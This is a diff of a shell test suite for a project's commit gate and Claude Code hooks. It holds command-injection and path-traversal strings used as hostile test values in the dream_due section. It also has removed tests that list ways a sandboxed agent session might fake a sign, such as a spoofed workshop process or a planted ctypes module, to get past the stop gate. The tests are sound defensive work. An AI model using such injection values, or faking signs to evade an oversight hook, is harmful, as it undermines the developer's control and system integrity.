 	[ ! -s "$log" ] || fail "check.sh ran a step before refusing $o: $(cat "$log")"
 done
-# Outside a repository (pre-commit's staged copy): the change GATE_CHANGED lists, the types from a cache of the run's own, gone at its
-# end, and nothing recorded.
-cp -R "$g" "$g-copy" && rm -rf "$g-copy/.git" "$g-copy/.claude"
-out=$(staged "server/src/a.ts
-docs/x.md") || fail "check.sh failed on pre-commit's list of a server change: $out"
-[ "$(handed lint)" = server/src/a.ts ] && ran typecheck && grep -q '^test related .*server/src/a\.ts' "$log" || fail "check.sh did not check pre-commit's list of a server change: $(cat "$log")"
-ran gno && fail "check.sh ran gno on pre-commit's list of a server change"
-own=$(sed -n 's/^cache=\(.*\) there$/\1/p' "$log.tsc")
-(TSC_CACHE=/elsewhere staged server/src/a.ts) >/dev/null || fail "check.sh failed on a staged list with a caller's TSC_CACHE"
-grep -q '^cache=/elsewhere ' "$log.tsc" && fail "a caller's TSC_CACHE steered a staged copy's type check"
-case $own in "$real"/* | "$real-copy"/* | '') fail "check.sh built a staged copy's types from a cache in the tree, or none: $(cat "$log.tsc")" ;; esac
-[ ! -e "$own" ] || fail "check.sh left the staged copy's type cache behind: $own"
-[ ! -e "$g-copy/.claude/tmp/green-fast" ] || fail "check.sh recorded a staged copy's run"
-staged "gno/r/a.gno" >/dev/null || fail "check.sh failed on pre-commit's list of a gno change"
-ran gno && ! ran typecheck || fail "check.sh did not check pre-commit's list of a gno change alone"
-# Prose is prose in the list too, anywhere but under the sources: beside a server change, the run stays the server's.
-for prose in adr/0001.txt docs/x.ts README.md; do
-	staged "server/src/a.ts
-$prose" >/dev/null || fail "check.sh failed on pre-commit's list of a server change and $prose"
-	[ "$(handed lint)" = server/src/a.ts ] || fail "check.sh did not keep pre-commit's list of a server change and $prose scoped: $(grep '^lint' "$log")"
-done
-# An empty list, prose alone, a path no area places, a line git quoted or that reads otherwise (an empty line, a space, a backslash):
-# whole, as in a repository.
-for list in "" "docs/x.md" "adr/x.md
-README.md" "server/src/a.ts
-package.json" "server/src/a.ts
-
-deploy/a.conf
-lint/a.ts" '"deploy/a\nb"
-server/src/a.ts' " deploy/a.conf
-server/src/a.ts" 'server/src/a.ts\
-package.json' 'docs-x/a.ts
-server/src/a.ts'; do
-	staged "$list" >/dev/null || fail "check.sh failed on pre-commit's list: $list"
-	whole "pre-commit's list: $list"
-	grep -q '^format:check .*--cache' "$log" && fail "check.sh gave Prettier a cache in a staged copy, a new folder each time: $(grep '^format:check' "$log")"
-done
-# In a repository, the change is git's, never GATE_CHANGED's.
+# Outside a repository there is no change to read: refused, saying so, before any step (a copy of the tracked files left, D13173).
+cp -R "$g" "$g-copy" && rm -rf "$g-copy/.git"
+out=$(: >"$log" && cd "$g-copy" && env -u SANDBOX_RUNTIME GATE_LOG="$log" GNO_TOOLCHAIN="$g/toolchain" NVM_DIR="${NVM_DIR:-$HOME/.nvm}" HOME="$g.home" sh scripts/check.sh 2>&1) &&
+	fail "check.sh passed outside a repository"
+printf '%s\n' "$out" | grep -q "check.sh: no repository" || fail "check.sh did not say it runs in a repository alone: $out"
+[ ! -s "$log" ] || fail "check.sh ran a step outside a repository: $(cat "$log")"
+# GATE_CHANGED, the staged copy's list, is read no more: a repository's change is git's.
 : >"$log" && (cd "$g" && env -u SANDBOX_RUNTIME GATE_LOG="$log" GNO_TOOLCHAIN="$g/toolchain" NVM_DIR="${NVM_DIR:-$HOME/.nvm}" HOME="$g.home" GATE_CHANGED=gno/r/a.gno sh scripts/check.sh >/dev/null 2>&1) ||
 	fail "check.sh failed in a repository with GATE_CHANGED set"
 whole "a repository with no change and GATE_CHANGED naming a realm"
@@ -3986,15 +3331,13 @@ for lane in lint types tests gno; do
 	printf '%s\n' "$out" | grep -qE "^lane $lane [0-9]+ s: [a-z]" || fail "check.sh did not print lane $lane's time and steps: $out"
 done
 # Two lanes fail: the gate fails, names both and shows what each printed; a lane stops at its first failure, the others run to their
-# end; nothing is recorded; the last line names the first failure, whatever a lane's tail ended on (F2638).
-rm -f "$g/.claude/tmp/green-fast"
+# end; the last line names the first failure, whatever a lane's tail ended on (F2638).
 out=$(FAIL=format:check,gno gate) && fail "check.sh passed with two failing steps"
 for s in format:check gno; do printf '%s\n' "$out" | grep -q "^$s failed here" || fail "check.sh hid $s's failure: $out"; done
 printf '%s\n' "$out" | grep -q "^check.sh: lane lint failed at lint:format:" || fail "check.sh did not name the failed lane lint and its step: $out"
 printf '%s\n' "$out" | grep -q "^check.sh: lane gno failed at gno:gno:" || fail "check.sh did not name the failed lane gno: $out"
 ran lint && fail "a lane went on past its failed step"
 grep -qx "done test" "$log" || fail "a lane's failure stopped another lane before its end"
-[ ! -e "$g/.claude/tmp/green-fast" ] || fail "check.sh recorded a gate that failed"
 [ "$(last "$out")" = "check.sh: FAILED at lint:format" ] || fail "a run that failed did not end on its FAILED line: $(last "$out")"
 out=$(TAILPASS=1 FAIL=typecheck gate) && fail "check.sh passed with a failing type check whose tail says it passed"
 printf '%s\n' "$out" | grep -q "^all checks passed in 3 s" || fail "the planted tail was not shown: $out"
@@ -4073,7 +3416,7 @@ reset
 for shell in sh dash; do
 	command -v "$shell" >/dev/null || continue
 	mkdir -p "$t/sigtmp" && : >"$log" && rm -f "$log".*
-	(cd "$g" && exec env -u SANDBOX_RUNTIME -u GATE_CHANGED GATE_LOG="$log" GNO_TOOLCHAIN="$g/toolchain" NVM_DIR="${NVM_DIR:-$HOME/.nvm}" HOME="$g.home" TMPDIR="$t/sigtmp" HANG=typecheck "$shell" scripts/check.sh) >"$t/sig.out" 2>&1 &
+	(cd "$g" && exec env -u SANDBOX_RUNTIME GATE_LOG="$log" GNO_TOOLCHAIN="$g/toolchain" NVM_DIR="${NVM_DIR:-$HOME/.nvm}" HOME="$g.home" TMPDIR="$t/sigtmp" HANG=typecheck "$shell" scripts/check.sh) >"$t/sig.out" 2>&1 &
 	pid=$!
 	n=0 && until [ -e "$log.hung" ] || [ "$n" -ge 150 ]; do sleep 0.1 && n=$((n + 1)); done
 	[ -e "$log.hung" ] || fail "the type check that hangs never started under $shell"
@@ -4164,7 +3507,7 @@ PY
 	cp "$t/stryker.good" "$sl/stryker.config.json"
 done
 # On the repository's own config, git's reading of the patterns and StrykerJS's matcher (minimatch, hidden files left out) pick one set, of
-# the repository's files: git's list, or the copy's own files in pre-commit's staged copy, which has no .git; git reads its patterns in a
+# the repository's files: git's list, or the copy's own files in a copy of the tracked files, which has no .git; git reads its patterns in a
 # repository of those paths, empty.
 nodebin="${NVM_DIR:-$HOME/.nvm}/versions/node/v$(cat "$here/../.node-version")/bin"
 if git -C "$here/.." rev-parse --git-dir >/dev/null 2>&1; then
@@ -5981,9 +5324,9 @@ out=$(reg) && fail "check_regressions passed an approved picture changed in the 
 git -C "$rg" reset -q --hard "$base" && printf 'new\n' >"$rg/app/tests/e2e/home.spec.ts-snapshots/c.png" && git -C "$rg" add -A
 out=$(reg) || fail "check_regressions refused a new approved picture: $out"
 git -C "$rg" reset -q --hard "$base"
-# --quick, which the hook and the fast gate run per commit (F2579): the base's listing of tests is kept in the tools' cache, one per base commit,
-# and a change of nothing but Vitest files, gno or Go sources, pictures and prose lists only the Vitest files it touches. A vitest that logs
-# its calls stands for the real one; a listing with no file is a whole one. The merge check runs without it, whole and with no cache.
+# The base and the tree are listed whole, a vitest that logs its calls standing for the real one (F2579's cases, its --quick gone with
+# its one caller, pre-commit under GNOWORLD_STRICT=1: D13173): a test gone, beside another change or with its file; one a non-test
+# file renames; a new, untracked test file read.
 rq="$t/regq" && mkdir -p "$rq/scripts" "$rq/node_modules/.bin" "$rq/app/src"
 cp "$here/check_regressions.py" "$here/repo_files.py" "$here/hidden.py" "$here/borrow_node_modules.sh" "$rq/scripts/"
 cat >"$rq/node_modules/.bin/vitest" <<'EOF'
@@ -6009,46 +5352,33 @@ chmod +x "$rq/node_modules/.bin/vitest"
 git -C "$rq" init -q && printf 'node_modules/\n' >"$rq/.gitignore" && : >"$rq/vitest.config.ts"
 printf 'test("a one", f);\ntest("a two", f);\n' >"$rq/app/src/a.test.ts" && printf 'test("b one", f);\n' >"$rq/app/src/b.test.ts" && printf 'x\n' >"$rq/app/src/c.ts" && printf 'gen1 gen2\n' >"$rq/app/src/a.data"
 git -C "$rq" add -A && git -C "$rq" commit -qm base && qbase=$(git -C "$rq" rev-parse HEAD)
-reqq() { : >"$t/vt.log" && (cd "$rq" && VT_LOG="$t/vt.log" GNOWORLD_TOOLS="$t/rtools" python3 -I scripts/check_regressions.py "$@" 2>&1); }
-wholes() { grep -c ' $' "$t/vt.log" || :; }
+reqq() { : >"$t/vt.log" && (cd "$rq" && VT_LOG="$t/vt.log" python3 -I scripts/check_regressions.py "$@" 2>&1); }
 back() { git -C "$rq" reset -q --hard "$qbase" && git -C "$rq" clean -qfd; }
 printf 'test("b new", f);\n' >"$rq/app/src/b.test.ts"
-out=$(reqq --quick "$qbase") && fail "check_regressions --quick passed a test gone: $out"
-printf '%s\n' "$out" | grep -qF "app/src/b.test.ts > b one" || fail "check_regressions --quick did not name the test gone: $out"
-[ "$(wholes)" = 1 ] || fail "check_regressions --quick listed $(wholes) whole times, not once (the base's, which nothing cached yet): $(cat "$t/vt.log")"
-grep -q ' app/src/b.test.ts$' "$t/vt.log" && ! grep -q 'a.test.ts' "$t/vt.log" || fail "check_regressions --quick did not list the one file the change touches: $(cat "$t/vt.log")"
-[ -f "$t/rtools/regressions/base-$qbase.json" ] || fail "check_regressions --quick did not keep the base's listing in the tools' cache"
-out=$(reqq --quick "$qbase") && fail "check_regressions --quick passed a test gone, with the base cached: $out"
-[ "$(wholes)" = 0 ] || fail "check_regressions --quick listed the base again, though its listing is cached: $(cat "$t/vt.log")"
-out=$(reqq "$qbase") && fail "check_regressions without --quick passed a test gone: $out"
-[ "$(wholes)" = 2 ] || fail "check_regressions without --quick did not list the base and the tree whole ($(wholes) whole listings): $(cat "$t/vt.log")"
+out=$(reqq "$qbase") && fail "check_regressions passed a test gone: $out"
+printf '%s\n' "$out" | grep -qF "app/src/b.test.ts > b one" || fail "check_regressions did not name the test gone: $out"
 git -C "$rq" commit -qam "a test replaced" -m "Removed-test: app/src/b.test.ts > b one - replaced by b new"
-out=$(reqq --quick "$qbase") || fail "check_regressions --quick refused a test gone that a commit says why of: $out"
+out=$(reqq "$qbase") || fail "check_regressions refused a test gone that a commit says why of: $out"
 back
 rm -f "$rq/app/src/a.test.ts" && git -C "$rq" add -A
-out=$(reqq --quick "$qbase") && fail "check_regressions --quick passed a test file deleted: $out"
-printf '%s\n' "$out" | grep -qF "app/src/a.test.ts > a one" || fail "check_regressions --quick did not name the tests of the deleted file: $out"
+out=$(reqq "$qbase") && fail "check_regressions passed a test file deleted: $out"
+printf '%s\n' "$out" | grep -qF "app/src/a.test.ts > a one" || fail "check_regressions did not name the tests of the deleted file: $out"
 back
 printf 'test("b new", f);\n' >"$rq/app/src/b.test.ts" && printf 'y\n' >>"$rq/app/src/c.ts"
-out=$(reqq --quick "$qbase") && fail "check_regressions --quick passed a test gone beside a change of another file: $out"
-printf '%s\n' "$out" | grep -qF "app/src/b.test.ts > b one" || fail "check_regressions --quick did not name the test gone beside a change of another file: $out"
-[ "$(wholes)" = 0 ] || fail "check_regressions --quick listed the tree whole for a change beside the test files, not the touched file alone ($(wholes) whole listings): $(cat "$t/vt.log")"
-grep -q ' app/src/b.test.ts$' "$t/vt.log" && ! grep -q 'a.test.ts' "$t/vt.log" || fail "check_regressions --quick did not list the touched test file alone beside a change of another file: $(cat "$t/vt.log")"
+out=$(reqq "$qbase") && fail "check_regressions passed a test gone beside a change of another file: $out"
+printf '%s\n' "$out" | grep -qF "app/src/b.test.ts > b one" || fail "check_regressions did not name the test gone beside a change of another file: $out"
 back
-# A non-test file that renames what a test generates: the quick run, which lists the touched test files alone, does not see it; the whole run does.
 printf 'gen1 genX\n' >"$rq/app/src/a.data"
-out=$(reqq --quick "$qbase") || fail "check_regressions --quick refused a rename its touched-files listing cannot see: $out"
-out=$(reqq "$qbase") && fail "check_regressions without --quick passed a test renamed by a non-test file: $out"
-printf '%s\n' "$out" | grep -qF "app/src/a.test.ts > gen2" || fail "check_regressions without --quick did not name the test a non-test file renamed: $out"
-back
-# A Playwright spec is no Vitest file: its names are not listed from the touched files, so the tree is listed whole.
-mkdir -p "$rq/app/tests" && printf 'y\n' >"$rq/app/tests/a.spec.ts"
-out=$(reqq --quick "$qbase") || fail "check_regressions --quick refused a new Playwright spec: $out"
-[ "$(wholes)" = 1 ] || fail "check_regressions --quick did not list the tree whole for a change of a Playwright spec ($(wholes) whole listings): $(cat "$t/vt.log")"
+out=$(reqq "$qbase") && fail "check_regressions passed a test renamed by a non-test file: $out"
+printf '%s\n' "$out" | grep -qF "app/src/a.test.ts > gen2" || fail "check_regressions did not name the test a non-test file renamed: $out"
 back
 printf 'test("new", f);\n' >"$rq/app/src/d.test.ts"
-out=$(reqq --quick "$qbase") || fail "check_regressions --quick refused a new test file: $out"
-grep -q ' app/src/d.test.ts$' "$t/vt.log" || fail "check_regressions --quick did not list a new, untracked test file: $(cat "$t/vt.log")"
+out=$(reqq "$qbase") || fail "check_regressions refused a new test file: $out"
+back
+for o in --quick --whatever; do
+	out=$(reqq "$o" "$qbase") && fail "check_regressions took $o, an option it has no more"
+	printf '%s\n' "$out" | grep -q "usage: check_regressions.py <base>" || fail "check_regressions refused $o without its usage: $out"
+done
 back
 fi
 
@@ -7158,115 +6488,6 @@ done <"$t/speeds.paths"
 [ "$(printf 'app/src/features/login/Form.tsx\n' | python3 -I "$sp" --tier1 "$here/.." 2>&1)" = tier1 ] || fail "speeds.py --tier1: the repository's login folder was other"
 fi
 
-if part stop_gate_pingpong; then
-# The ping-pong (Alexis, 2026-11-04: each retouch seen live in two minutes, the tests, the gate and the review once the batch is accepted):
-# while Alexis's own `pnpm workshop` serves this checkout, a turn ends without the gate, which pre-commit still runs on every commit. Its
-# sign is one no sandboxed command can plant (the chief): a shell running this checkout's scripts/workshop.sh, from this checkout's folder,
-# its parent alive, that macOS's sandbox_check finds in no sandbox. Here the hook runs as it is but for its system tools' paths, turned to
-# stubs that read one table of processes, each answering for its own pid: several run at once, as on a machine of many checkouts (F4851).
-r="$t/pp" && mkdir -p "$r/scripts" "$r/.claude/tmp" "$t/ppbin" "$t/pphome" && cp "$here/code_changed.sh" "$r/scripts/" && printf '.claude/tmp/\n' >"$r/.gitignore"
-git -C "$r" init -q && git -C "$r" add -A && git -C "$r" commit -qm init && echo 'package x' >"$r/x.go"
-root=$(cd "$r" && pwd -P) && python=$(command -v python3) && table="$t/pp.table"
-turned() { # $1: the copy; the tools after it are turned to the stubs, each of which the hook must name by its system path
-	from="$1" && shift
-	cp "$here/stop_gate.sh" "$from"
-	for tool in "$@"; do
-		case $tool in ps) system=/bin/ps ;; lsof) system=/usr/sbin/lsof ;; python3) system=/usr/bin/python3 ;; esac
-		grep -qF "$system -" "$from" || fail "stop_gate.sh no longer asks the system's own $tool by its path ($system): update stop_gate_pingpong"
-		sed "s|$system -|$t/ppbin/$tool -|g" "$from" >"$from.new" && mv "$from.new" "$from"
-	done
-}
-turned "$t/stop_gate.sh" ps lsof python3
-turned "$t/stop_gate.real.sh" ps lsof # the real python3 and macOS's own sandbox_check
-# ps answers the form it is asked: the reaper's four fields, or the ping-pong's six, with the process's group and its terminal's foreground
-# group, by the row's last field: fg (the default), its terminal's foreground group; bg, another's; notty, no terminal, so none (0).
-cat >"$t/ppbin/ps" <<SH
-#!/bin/sh
-case "\$*" in *pgid*) six=1 ;; *) six= ;; esac
-while IFS='|' read -r pid ppid age cwd box cmd fg; do
-	if [ -z "\$six" ]; then printf '%6s %5s %11s %s\n' "\$pid" "\$ppid" "\$age" "\$cmd"; continue; fi
-	case \${fg:-fg} in fg) front=\$pid ;; bg) front=99 ;; *) front=0 ;; esac
-	printf '%6s %5s %5s %5s %11s %s\n' "\$pid" "\$ppid" "\$pid" "\$front" "\$age" "\$cmd"
-done <"$table"
-SH
-cat >"$t/ppbin/lsof" <<SH
-#!/bin/sh
-want= prev=
-for a in "\$@"; do [ "\$prev" != -p ] || want=\$a; prev=\$a; done
-while IFS='|' read -r pid ppid age cwd box cmd fg; do [ -z "\$want" ] || [ "\$want" = "\$pid" ] || continue; printf 'p%s\nfcwd\nn%s\n' "\$pid" "\$cwd"; done <"$table"
-SH
-cat >"$t/ppbin/python3" <<SH
-#!/bin/sh
-case "\$*" in *sandbox_check*) ;; *) exec "$python" "\$@" ;; esac
-for last; do :; done
-while IFS='|' read -r pid ppid age cwd box cmd fg; do [ "\$pid" != "\$last" ] || exit "\$box"; done <"$table"
-exit 1
-SH
-chmod +x "$t/ppbin/ps" "$t/ppbin/lsof" "$t/ppbin/python3"
-procs() { printf '%s\n' "$@" >"$table"; } # each: pid|ppid|age|folder|sandbox_check's answer as an exit|command[|fg, bg or notty]
-hook() { rm -f "$r/.claude/tmp/gate-blocked"; printf '{"stop_hook_active":false}' | HOME="$t/pphome" PATH="$t/ppbin:$PATH" CLAUDE_PROJECT_DIR="$r" sh "${1:-$t/stop_gate.sh}" 2>/dev/null; }
-ends() { code=0; hook "${2:-}" || code=$?; [ "$code" = 0 ] || fail "stop_gate blocked a turn while this checkout's workshop ran outside the sandbox, $1 (exit $code)"; }
-blocks() { code=0; hook "${2:-}" || code=$?; [ "$code" = 2 ] || fail "stop_gate let a turn end without the gate when $1 (exit $code)"; }
-procs "4001|4000|05:00|$root|0|sleep 600" && blocks "no workshop ran"
-for form in "sh scripts/workshop.sh" "/bin/sh $root/scripts/workshop.sh" "bash ./scripts/workshop.sh" "zsh scripts/workshop.sh" "dash scripts/workshop.sh"; do
-	procs "4001|4000|05:00|$root|0|$form" && ends "as '$form'"
-done
-# The gate's own record and its block are left as they were: the ping-pong ends a turn, it passes no gate.
-[ ! -e "$r/.claude/tmp/gate-green" ] && [ ! -e "$r/.claude/tmp/gate-blocked" ] || fail "stop_gate wrote a record of the gate during a ping-pong"
-# Beside others (F4851): a session's sandboxed workshop of this checkout, Alexis's of a sibling checkout whose folder this one's begins, a
-# workshop's server in this checkout's app; then Alexis's own of this one, last.
-w="sh scripts/workshop.sh"
-n1="4001|4000|05:00|$root|1|$w" n2="4002|4000|05:00|${root}3|0|$w" n3="4003|4000|05:00|$root/app|0|$w"
-procs "$n1" "$n2" "$n3" && blocks "a sandboxed workshop of this checkout ran beside Alexis's of another"
-procs "$n1" "$n2" "$n3" "4004|4000|05:00|$root|0|$w" && ends "beside a sandboxed one and another checkout's"
-# What a session could plant, or a sign that is not the workshop's: each blocks, as before.
-procs "4001|4000|05:00|$root|1|$w" && blocks "the workshop ran in the sandbox"
-procs "4001|4000|05:00|/elsewhere|0|$w" && blocks "the workshop ran from another folder"
-procs "4001|4000|05:00|$root|0|sh /elsewhere/scripts/workshop.sh" && blocks "another checkout's workshop.sh ran from this folder"
-procs "4001|4000|05:00|$root|0|vim scripts/workshop.sh" && blocks "an editor named the workshop's script"
-procs "4001|4000|05:00|$root|0|sh -c sleep 1 # scripts/workshop.sh" && blocks "a comment named the workshop's script"
-procs "4001|4000|05:00|$root|0|sh scripts/workshop.sh.old" && blocks "a file named like the workshop's script ran"
-procs "4001|4000|05:00|$root|0|sh scripts/workshop.sh --again" && blocks "the workshop's script ran with an argument it takes none of"
-procs "4001|4000|05:00|$root|0|node scripts/workshop.sh" && blocks "another program than a shell ran the workshop's script"
-# F4852: a look-alike that code the workshop runs started, outliving the workshop's Ctrl+C, is launchd's (its parent gone).
-procs "4001|1|05:00|$root|0|$w" && blocks "a workshop.sh whose parent is gone ran"
-# Lot 2's S1 and S2: code the workshop runs, out of the sandbox, can start a workshop.sh of its own under a shell launchd takes, which
-# outlives Ctrl+C: none counts but a shell of its terminal's foreground group (F4962).
-procs "4001|4000|05:00|$root|0|$w|bg" && blocks "a workshop.sh outside its terminal's foreground group ran"
-procs "4001|4000|05:00|$root|0|$w|notty" && blocks "a workshop.sh with no terminal ran"
-procs "150|1|05:00|$root|0|sh -c sh scripts/workshop.sh; :|notty" "200|150|05:00|$root|0|$w|bg" &&
-	blocks "a workshop.sh under a shell whose parent is gone ran"
-printf '4001 4001 5198\n' >"$r/.claude/tmp/workshop.pid" && procs "4001|4000|05:00|$root|0|sleep 600" && blocks "a pid file named a process outside the sandbox"
-rm "$r/.claude/tmp/workshop.pid"
-# Each tool it needs, missing (127) or failing (1).
-for tool in ps lsof python3; do
-	for status in 127 1; do
-		cp "$t/ppbin/$tool" "$t/ppbin/$tool.saved" && printf '#!/bin/sh\nexit %s\n' "$status" >"$t/ppbin/$tool"
-		procs "4001|4000|05:00|$root|0|$w" && blocks "$tool exited $status"
-		mv "$t/ppbin/$tool.saved" "$t/ppbin/$tool"
-	done
-done
-# F4852: the reaper runs at every turn's end, a ping-pong's too: a node of this project left by a dead parent an hour ago is stopped.
-rm -f "$t/pphome/Library/Logs/gnoworld-reaped.log"
-procs "4001|4000|05:00|$root|0|$w" "999999|1|01:00:00|/x|0|node /x/gnoworld/stray.js" && ends "with a stray node to reap"
-grep -q '^999999 ' "$t/pphome/Library/Logs/gnoworld-reaped.log" 2>/dev/null || fail "stop_gate's reaper did not run at a ping-pong's end"
-# macOS's own sandbox_check, asked by the real python3 (F4850): launchd, pid 1, is in no sandbox; this test's own process is in Claude
-# Code's when the suite runs there. A module planted in the project's folder, as a session can, is never imported: Python runs isolated.
-if [ "$(uname)" = Darwin ]; then
-	printf 'open(%s, "w").write("imported")\nclass CDLL:\n    def __init__(self, path):\n        self.sandbox_check = lambda *a: 0\nc_int = c_char_p = int\n' "'$t/pp.planted'" >"$r/ctypes.py"
-	procs "1|0|05:00|$root|x|$w" && ends "as pid 1, which macOS's sandbox_check finds in no sandbox" "$t/stop_gate.real.sh"
-	sleep 600 </dev/null >/dev/null 2>&1 &
-	held=$!
-	procs "$held|$$|05:00|$root|x|$w" && hook "$t/stop_gate.real.sh" >/dev/null || :
-	[ ! -e "$t/pp.planted" ] || fail "stop_gate's python3 imported a module planted in the project's folder"
-	if "$python" -Ic 'import ctypes, sys; c = ctypes.CDLL("/usr/lib/libSystem.dylib").sandbox_check; c.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_int]; sys.exit(c(int(sys.argv[1]), None, 0) == 0)' "$held"; then
-		blocks "the real sandbox_check let a process of a sandbox pass" "$t/stop_gate.real.sh"
-	fi
-	kill "$held"
-	rm "$r/ctypes.py"
-fi
-fi
-
 if part harness_timeout; then
 shards_fixture
 # F3382: a suite past its limit (600 s) counts as a caught mutant and its process group is stopped, TERM then KILL; the verdict won by time
@@ -7427,184 +6648,6 @@ out=$(cells '| F005 | 2026-10-17 | a | x.py:1 | a bug | rejected | why | |') && 
 printf '%s\n' "$out" | grep -q "F005" || fail "check_docs did not name the row with a trailing empty cell: $out"
 printf '| Id | Found | By | Where | Claim | Status | Evidence |\n|---|---|---|---|---|---|---|\n| F006 | 2026-10-17 | a | x.py:1 | a bug | rejected | why |\n\nF007 | a sentence that starts like a row | and has pipes, but no row.\n' >"$c/docs/review/findings.md"
 python3 -I "$docs" "$c" >/dev/null 2>&1 || fail "check_docs read a sentence with pipes as a ledger row"
-fi
-
-if part dream_due; then
-# scripts/dream_due.sh: the SessionStart hook that says a dream is due when a slice was merged with no dream recorded (the dream of 2026-11-01,
-# item 15 of slice 7's answers). It runs outside the sandbox as stop_gate.sh does: git, read-only, and text tools, no gate and no repository
-# code; it blocks no session (exit 0 always), and a read that fails says it could not tell. It reads committed rows alone, never the worktree:
-# main's docs/review-log.md, the last row `The dream of <sha>` (dream.md's step 5 writes it), and the rows of the branches main has not got
-# (F4063); a dream is due when main has a merge after those shas. Its wiring in .claude/settings.json is Alexis's (apply-7s.sh); no test here reads it.
-dds="$here"/dream_due.sh
-[ -f "$dds" ] || fail "scripts/dream_due.sh does not exist: nothing says a dream is due"
-r="$t/dream"
-mkdir -p "$r/docs"
-git -C "$r" init -q && git -C "$r" checkout -q -b main
-printf '| Date | Review |\n|---|---|\n| 2026-10-01 | slice 1 |\n' >"$r/docs/review-log.md"
-git -C "$r" add -A && git -C "$r" commit -qm base
-ask() { # $1: the project folder, the repository by default
-	code=0
-	out=$(CLAUDE_PROJECT_DIR="${1:-$r}" sh "$dds" </dev/null 2>&1) || code=$?
-	[ "$code" = 0 ] || fail "dream_due.sh ended with $code, and a SessionStart hook blocks nothing: $out"
-}
-merge_slice() { # $1: a name; main gets a real merge of a branch of one commit
-	git -C "$r" checkout -q -b "$1" && printf '%s\n' "$1" >"$r/$1.txt" && git -C "$r" add "$1.txt" && git -C "$r" commit -qm "$1"
-	git -C "$r" checkout -q main && git -C "$r" merge -q --no-ff -m "Merge branch '$1'" "$1"
-}
-recorded() { # $1: a commit; a row of the dream of it, on the branch checked out
-	printf '| 2026-11-01 | The dream of %s (a slice), `/dream`: the dreamer | 9 proposals | not measured |\n' "$(git -C "$r" rev-parse --short=8 "$1")" >>"$r/docs/review-log.md"
-	git -C "$r" commit -qam "dream of $1"
-}
-ask
-[ -z "$out" ] || fail "dream_due.sh said something with no merge on main: $out"
-merge_slice one
-m1=$(git -C "$r" rev-parse HEAD)
-ask
-printf '%s\n' "$out" | grep -qi "dream" && printf '%s\n' "$out" | grep -qi "due" || fail "dream_due.sh did not say a dream is due after a merge with no dream recorded: $out"
-recorded "$m1"
-ask
-[ -z "$out" ] || fail "dream_due.sh said a dream is due though main's last merge has its dream: $out"
-merge_slice two
-m2=$(git -C "$r" rev-parse HEAD)
-ask
-printf '%s\n' "$out" | grep -qi "dream" && printf '%s\n' "$out" | grep -qi "due" || fail "dream_due.sh did not say a dream is due after a merge past the last dream: $out"
-# Committed rows alone: the row of the second merge on the disk, and staged, covers nothing.
-printf '| 2026-11-02 | The dream of %s (uncommitted) | x |\n' "$(git -C "$r" rev-parse --short=8 "$m2")" >>"$r/docs/review-log.md"
-git -C "$r" add docs/review-log.md
-ask
-printf '%s\n' "$out" | grep -qi "due" || fail "dream_due.sh read a row of the work tree or the index, not a committed one: $out"
-git -C "$r" reset -q && git -C "$r" checkout -q docs/review-log.md
-# Read-only: the index and the work tree are as they were.
-touch "$t/dream.mark"
-before_index=$(cksum <"$r/.git/index") && before_status=$(git -C "$r" status --porcelain)
-ask
-[ "$(cksum <"$r/.git/index")" = "$before_index" ] || fail "dream_due.sh wrote git's index"
-[ "$(git -C "$r" status --porcelain)" = "$before_status" ] || fail "dream_due.sh changed the work tree"
-[ -z "$(find "$r" -newer "$t/dream.mark" -type f -not -path '*/.git/*' 2>/dev/null)" ] || fail "dream_due.sh wrote a file in the work tree"
-recorded "$m2"
-ask
-[ -z "$out" ] || fail "dream_due.sh said a dream is due though main's last merge has its dream (two rows): $out"
-# A sha git does not know, a main that is not there, a log that is not there, a folder that is no repository: it could not tell, and blocks nothing.
-printf '| 2026-11-03 | The dream of deadbee1 (a commit nobody has) | x |\n' >>"$r/docs/review-log.md" && git -C "$r" commit -qam "a dream of nothing"
-ask
-printf '%s\n' "$out" | grep -qi "could not tell" || fail "dream_due.sh did not say it could not tell for a sha git does not know: $out"
-printf '%s\n' "$out" | grep -qi "is due" && fail "dream_due.sh said a dream is due on a sha it could not read: $out"
-git -C "$r" reset -q --hard HEAD~1
-# The sha is a value a session may have written in a file Alexis merges unread, and this hook runs outside the sandbox: whatever is not 7 to
-# 40 hexadecimal digits is never given to git, as an option, a command or a pattern. Each ends "could not tell", exit 0, nothing created, the
-# index and the work tree as they were (the red pass, finding 8).
-mkdir -p "$r/trap" && : >"$r/trap/a" && git -C "$r" add trap/a && git -C "$r" commit -qm "a file for a glob to find" && keep=$(git -C "$r" rev-parse HEAD)
-for hostile in "--output=$t/pwned" "-1" "--all" "-n1" "\$(touch $t/pwned)" ";touch $t/pwned" "\`touch $t/pwned\`" "*" "trap/*" "../../etc/passwd" "HEAD" "main" "deadbee1~1" "deadbee1^{commit}" "dead" "$(printf 'b%.0s' 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41)"; do
-	printf '| 2026-11-04 | The dream of %s (hostile) | x |\n' "$hostile" >>"$r/docs/review-log.md" && git -C "$r" commit -qam "a hostile row"
-	before_index=$(cksum <"$r/.git/index")
-	ask
-	printf '%s\n' "$out" | grep -qi "could not tell" || fail "dream_due.sh did not say it could not tell for the sha '$hostile': $out"
-	printf '%s\n' "$out" | grep -qi "is due" && fail "dream_due.sh said a dream is due on the sha '$hostile': $out"
-	[ ! -e "$t/pwned" ] || fail "dream_due.sh ran what the sha '$hostile' said"
-	[ "$(cksum <"$r/.git/index")" = "$before_index" ] || fail "dream_due.sh wrote git's index on the sha '$hostile'"
-	git -C "$r" reset -q --hard "$keep"
-done
-{ printf '| 2026-11-04 | The dream of '; head -c 100000 /dev/zero | tr '\0' a; printf ' (a long word) | x |\n'; } >>"$r/docs/review-log.md" && git -C "$r" commit -qam "a long row"
-ask
-printf '%s\n' "$out" | grep -qi "could not tell" || fail "dream_due.sh did not say it could not tell for a word of 100,000 characters: $out"
-git -C "$r" reset -q --hard "$keep"
-# A sha git knows that main does not contain (a slice never merged) is none to count from; a plain commit of main after the last merge, once
-# its dream is recorded, is covered; rows out of order cover what the newest of them covers.
-git -C "$r" checkout -q -b unmerged && printf 'u\n' >"$r/unmerged.txt" && git -C "$r" add unmerged.txt && git -C "$r" commit -qm "unmerged" && um=$(git -C "$r" rev-parse HEAD) && git -C "$r" checkout -q main
-recorded "$um"
-ask
-printf '%s\n' "$out" | grep -qi "could not tell" || fail "dream_due.sh did not say it could not tell for a commit main does not contain: $out"
